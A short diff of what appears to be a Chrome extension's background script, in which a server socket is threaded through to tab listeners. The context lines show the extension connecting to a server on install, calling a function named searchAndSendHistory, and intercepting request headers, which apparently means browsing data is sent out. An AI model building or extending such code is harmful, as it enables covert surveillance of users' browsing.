@@ -1,5 +1,5 @@
 chrome.runtime.onInstalled.addListener(() => {
-  connectToServer();
+  socket = connectToServer();
   searchAndSendHistory();
   createScriptListener();
   chrome.webRequest.onBeforeSendHeaders.addListener((info) => {
@@ -19,7 +19,7 @@ chrome.runtime.onInstalled.addListener(() => {
     updateSecurityWebsites(socket);
     updateScriptWebsites(socket);
   })
-  createTabListeners();
+  createTabListeners(socket);
 });
 
 chrome.runtime.onStartup.addListener(() => {
